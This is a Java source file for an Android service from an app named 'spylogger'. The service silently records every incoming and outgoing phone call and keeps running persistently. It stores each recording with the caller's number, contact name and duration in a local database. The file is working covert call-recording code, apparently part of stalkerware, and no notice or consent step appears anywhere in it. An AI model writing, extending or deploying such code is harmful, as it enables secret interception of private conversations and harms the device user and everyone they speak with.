package com.gravatasufoca.spylogger.services;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.gmailsender.Utils;
import com.gravatasufoca.spylogger.helpers.MediaRecorderHelper;
import com.gravatasufoca.spylogger.model.Gravacao;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioGravacaoImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.utilidades.gravata.utils.Utilidades;

import java.io.IOException;
import java.sql.SQLException;
import java.util.Date;

public class RecordService extends Service{

	private boolean remetente;
	private RepositorioGravacao repositorioGravacao;
	private RepositorioTopico repositorioTopico;
	private static MyPhoneStateListener phoneListener;
	private String INCOMING_CALL_ACTION = "android.intent.action.PHONE_STATE";
	private String OUTGOING_CALL_ACTION = "android.intent.action.NEW_OUTGOING_CALL";
	private String phoneNumber;

	private MediaRecorderHelper mediaRecorderHelper;

	private final IBinder mBinder = new LocalBinder();

	public class LocalBinder extends Binder {
		RecordService getService() {
			return RecordService.this;
		}
	}

	private BroadcastReceiver callReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {

			if(mediaRecorderHelper==null){
				try {
					mediaRecorderHelper=new MediaRecorderHelper(getApplicationContext(),0,false);
					mediaRecorderHelper.setLigacao(true);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

			if(phoneListener==null){
				phoneListener = new MyPhoneStateListener(intent);

				TelephonyManager telephony = (TelephonyManager) context
						.getSystemService(Context.TELEPHONY_SERVICE);
				telephony.listen(phoneListener,
						PhoneStateListener.LISTEN_CALL_STATE);
			}else{
				phoneListener.setIntent(intent);
			}

			if (Intent.ACTION_NEW_OUTGOING_CALL.equals(intent.getAction())) {
				 setPhoneNumber(intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER));
		 	}
		}

	};

	class MyPhoneStateListener extends PhoneStateListener {

		private Intent intent;

		MyPhoneStateListener(Intent intent) {
			super();
			this.intent=intent;
		}
		public void setIntent(Intent intent) {
			this.intent = intent;
		}
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {

			if(state == TelephonyManager.CALL_STATE_IDLE){
				// DESLIGUEI
				Log.d("DEBUG", "IDLE");

				if (mediaRecorderHelper.isRecording()) {
					mediaRecorderHelper.stop();

					try {

						repositorioGravacao = new RepositorioGravacaoImpl(getApplicationContext());
						repositorioTopico=new RepositorioTopicoImpl(getApplicationContext());

						Gravacao gravacao=new Gravacao();
						gravacao.setRemetente(remetente);
						gravacao.setData(new Date());
						gravacao.setAudio(Utils.getBytes(mediaRecorderHelper.getRecordedFile()));
						gravacao.setNumero(phoneNumber);
						gravacao.setNome(com.gravatasufoca.spylogger.utils.Utils.getContactDisplayNameByNumber(phoneNumber,getApplicationContext().getContentResolver()));
						gravacao.setDuracao(mediaRecorderHelper.getDuration());

						Topico topico = repositorioTopico.findByName(gravacao.getNome());
						if (topico == null) {
							topico = new Topico.TopicoBuilder()
									.setNome(gravacao.getNome())
									.setIdReferencia(gravacao.getNumero())
									.build();

							repositorioTopico.inserir(topico);
						}
						gravacao.setTopico(topico);
						repositorioGravacao.inserir(gravacao);
					} catch (IOException | SQLException e) {
						e.printStackTrace();
					}

				}

			}else{
				if(!mediaRecorderHelper.isRecording()){
					if(state == TelephonyManager.CALL_STATE_OFFHOOK){
						// ESTOU LIGANDO
						Log.d("DEBUG", "OFFHOOK");
						setRemetente(true);

					}else{
						// RECEBI
						Log.d("DEBUG", "RINGING");
						setPhoneNumber(incomingNumber);
						setRemetente(false);
					}

//					if(!Utils.isInBlackList(context, phoneNumber))
					try {
						mediaRecorderHelper.start();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
			}
		}
	}


	@Override
	public void onCreate() {
		super.onCreate();

		IntentFilter intentToReceiveFilter = new IntentFilter();
		intentToReceiveFilter.addAction(INCOMING_CALL_ACTION);
		intentToReceiveFilter.addAction(OUTGOING_CALL_ACTION);
		this.registerReceiver(callReceiver, intentToReceiveFilter);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		//super.onStart(intent, startId);

		Utilidades.verifyPremium(this);
		return START_STICKY;
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return mBinder;
	}

	public void setPhoneNumber(String phoneNumber) {
		this.phoneNumber = phoneNumber;
	}

	public void setRemetente(boolean remetente) {
		this.remetente = remetente;
	}
}
